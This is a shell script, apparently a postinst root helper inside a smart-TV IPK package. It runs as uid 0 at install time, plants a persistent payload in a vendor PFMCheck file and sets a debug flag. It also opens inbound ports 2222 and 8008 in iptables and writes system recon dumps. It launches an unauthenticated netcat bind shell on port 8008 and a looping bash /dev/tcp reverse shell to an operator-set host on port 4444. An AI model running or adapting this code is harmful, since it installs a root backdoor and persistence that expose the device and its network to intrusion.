#!/bin/sh
# alvidaa one-shot root helper. Runs as uid 0 from the IPK's postinst
# (opkg -> superwatch 82). No binaries, no partition writes: everything it
# touches is /APPS (rw) and /var/local (rw).
#
# v2: busybox-only shell (this build has no nohup/setsid in PATH), so the root
#     channels are started through `busybox setsid`; adds an inbound root shell
#     on 8008 next to the outbound one on 4444.
D=/APPS/.alvidaa
L=$D/installer_log.txt
# the phonehome host is per-install: export ALVIDAA_HOST=<lan-host> before
# triggering the install, or leave it empty and rely on the inbound :8008 lane
HOST="${ALVIDAA_HOST:-}"
RPORT=4444
LPORT=8008
BB=/usr/local/bin/busybox
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$PATH
export PATH
[ -x "$BB" ] || BB=""

mkdir -p "$D" 2>/dev/null
: > "$L"
log(){ echo "$*" >> "$L"; }
bb(){ if [ -n "$BB" ]; then "$BB" "$@"; else "$@"; fi; }

log "=== alvidaa installer v2 $(date) ==="
log "--- identity ---"
bb id >> "$L" 2>&1
grep -E '^(Uid|Gid|CapEff):' /proc/self/status >> "$L" 2>&1
bb uname -a >> "$L" 2>&1
log "--- toolbox ---"
for c in wget curl nc socat busybox bash setsid nohup telnet httpd pidof pgrep; do
    printf '%s=' "$c" >> "$L"
    command -v "$c" >> "$L" 2>&1 || echo none >> "$L"
done
log "--- busybox applets (subset) ---"
bb --list 2>/dev/null | tr ' ' '\n' | grep -E '^(nc|nohup|setsid|telnet|wget|httpd|pidof|watch|sleep|sh|ash)$' >> "$L" 2>&1
log "--- nc help ---"
bb nc --help >> "$L" 2>&1

log "--- dirs ---"
mkdir -p /var/local/alvidaa /var/local/pfmParse/Data >> "$L" 2>&1
log "mkdir rc=$?"
ls -ld /var/local/pfmParse /var/local/pfmParse/Data >> "$L" 2>&1

log "--- proof ---"
{
    echo "uid=$(bb id -u 2>/dev/null)"
    bb id 2>/dev/null
    bb uname -a 2>/dev/null
    grep -E '^(Uid|Gid|CapEff):' /proc/self/status
    date
    cat /proc/uptime
} > /var/local/alvidaa/proof.txt 2>&1
chmod 755 /var/local/alvidaa 2>/dev/null
chmod 644 /var/local/alvidaa/proof.txt 2>/dev/null

log "--- pfm lane ---"
cat > /var/local/pfmParse/Data/platform.txt <<'PLATFORM_EOF'
osPlatform=mtk9618
osModel=65A85QEVS
osVersion=V0000.09.60A.Q0602
osDebugVersion=0
osChannel=1
osFormat=1
logLimitTime=0
bootPaddingTime=0
signalList=dtv-launcher
runMaxCount=1
userAction=now
PLATFORM_EOF
cat > /var/local/pfmParse/PFMCheck <<'PFMCHECK_EOF'
runSignal=PFM
runCount=99
runMaxCount=1
mkdir -p /var/local/alvidaa
{ id; date; uname -a; cat /proc/uptime; cat /proc/version; } > /var/local/alvidaa/proof.txt 2>&1
chmod 755 /var/local/alvidaa; chmod 644 /var/local/alvidaa/proof.txt 2>/dev/null
cp -f /var/local/pfmParse/PFMCheck /var/local/alvidaa/PFMCheck.bak 2>/dev/null; cp -f /var/local/pfmParse/Data/platform.txt /var/local/alvidaa/platform.bak 2>/dev/null; chmod 644 /var/local/alvidaa/PFMCheck.bak /var/local/alvidaa/platform.bak 2>/dev/null
echo "alvidaa payload ran $(date) uid=$(id -u)" >> /var/local/alvidaa/payload.log 2>/dev/null
( sleep 8; mkdir -p /var/local/pfmParse/Data; cp -f /var/local/alvidaa/PFMCheck.bak /var/local/pfmParse/PFMCheck 2>/dev/null; cp -f /var/local/alvidaa/platform.bak /var/local/pfmParse/Data/platform.txt 2>/dev/null; touch /var/local/DebugPowerup; chmod 644 /var/local/pfmParse/PFMCheck /var/local/pfmParse/Data/platform.txt /var/local/DebugPowerup 2>/dev/null; sync ) >/dev/null 2>&1 &
( date; id; uname -a; echo "--- mounts"; cat /proc/mounts; echo "--- iptables"; iptables -S INPUT 2>&1; echo "--- var/local"; ls -la /var/local; echo "--- ps"; ps 2>/dev/null | head -60; echo "--- net tcp"; cat /proc/net/tcp 2>/dev/null | head -30 ) > /var/local/alvidaa/recon.txt 2>&1; chmod 644 /var/local/alvidaa/recon.txt 2>/dev/null &
[ -n "$HOST" ] && ( i=0; while [ $i -lt 720 ]; do bash -c 'exec 3<>/dev/tcp/'"$HOST"'/'"$RPORT"' && exec /bin/sh <&3 >&3 2>&3' 2>/dev/null; sleep 10; i=$((i+1)); done ) >/dev/null 2>&1 &
( while true; do sleep 60; touch /var/local/DebugPowerup 2>/dev/null; done ) >/dev/null 2>&1 &
sync
PFMCHECK_EOF
chmod 644 /var/local/pfmParse/PFMCheck /var/local/pfmParse/Data/platform.txt 2>/dev/null
cp -f /var/local/pfmParse/PFMCheck /var/local/alvidaa/PFMCheck.bak 2>/dev/null
cp -f /var/local/pfmParse/Data/platform.txt /var/local/alvidaa/platform.bak 2>/dev/null
touch /var/local/DebugPowerup
chmod 644 /var/local/DebugPowerup 2>/dev/null
log "pfm: $(ls -l /var/local/pfmParse/PFMCheck 2>&1 | head -1)"

# The kit's boot.sh owns the PFM payload; if it is already deployed, let it
# re-plant so a re-install cannot roll the gate back to this inline copy.
if [ -f /var/local/alvidaa/boot.sh ]; then
    log "--- kit replant (single source of truth: boot.sh) ---"
    /bin/sh /var/local/alvidaa/boot.sh replant >> "$L" 2>&1
    log "kit replant rc=$?"
    /bin/sh /var/local/alvidaa/boot.sh >> "$L" 2>&1
    log "kit start rc=$?"
fi

log "--- firewall ---"
for P in 2222 8008; do
    iptables -C INPUT -p tcp --dport "$P" -j ACCEPT 2>/dev/null || iptables -I INPUT 1 -p tcp --dport "$P" -j ACCEPT >> "$L" 2>&1
    iptables -C FIREWALL_IN_EULAON -p tcp --dport "$P" -j ACCEPT 2>/dev/null || iptables -I FIREWALL_IN_EULAON 1 -p tcp --dport "$P" -j ACCEPT >> "$L" 2>&1
done
iptables -S INPUT >> "$L" 2>&1

log "--- keep a copy for re-trigger ---"
cp -f /APPS/installer.ipk /var/local/alvidaa/installer.ipk >> "$L" 2>&1
chmod 644 /var/local/alvidaa/installer.ipk 2>/dev/null

log "--- root channels ---"
cat > "$D/shell_listener.sh" <<LISTEN_EOF
#!/bin/sh
while true; do
    /usr/local/bin/busybox nc -l -p $LPORT -e /bin/sh 2>/dev/null
    sleep 2
done
LISTEN_EOF
chmod 755 "$D/shell_listener.sh"

cat > "$D/phonehome.sh" <<PHONE_EOF
#!/bin/sh
while true; do
    /bin/bash -c "exec 3<>/dev/tcp/$HOST/$RPORT && exec /bin/sh <&3 >&3 2>&3"
    sleep 5
done
PHONE_EOF
chmod 755 "$D/phonehome.sh"

if [ -n "$BB" ]; then
    "$BB" setsid /bin/sh "$D/shell_listener.sh" >/dev/null 2>&1 < /dev/null &
    log "listener launched rc=$?"
    sleep 2
    log "listener tcp: $(grep -i ':1F48' /proc/net/tcp 2>/dev/null | head -2)"
    "$BB" setsid /bin/sh "$D/phonehome.sh" >/dev/null 2>&1 < /dev/null &
    log "phonehome launched rc=$?"
else
    /bin/sh "$D/shell_listener.sh" >/dev/null 2>&1 < /dev/null &
    /bin/sh "$D/phonehome.sh" >/dev/null 2>&1 < /dev/null &
    log "launched without setsid"
fi
sleep 1
log "--- procs ---"
bb ps >> "$L" 2>&1

log "--- recon ---"
{
    date
    bb id
    bb uname -a
    echo "--- mounts"; cat /proc/mounts
    echo "--- iptables"; iptables -S 2>&1
    echo "--- var/local"; ls -la /var/local 2>&1
    echo "--- APPS"; ls -la /APPS 2>&1 | head -40
    echo "--- aliases"; ls -la /APPS/.alvidaa /APPS/.re_sshd 2>&1
    echo "--- ps"; bb ps 2>&1 | head -80
    echo "--- net"; cat /proc/net/tcp 2>&1 | head -30
    echo "--- bin"; ls /bin 2>/dev/null | head -80
    echo "--- usrbin"; ls /usr/bin 2>/dev/null | head -80
    echo "--- usrsbin"; ls /usr/sbin 2>/dev/null | head -80
    echo "--- sbin"; ls /sbin 2>/dev/null | head -40
    echo "--- vendor"; ls -la /var/local/alpac* 2>&1
} > /var/local/alvidaa/recon.txt 2>&1
chmod 644 /var/local/alvidaa/recon.txt 2>/dev/null
log "=== done $(date) ==="
chmod 644 "$L" 2>/dev/null
exit 0
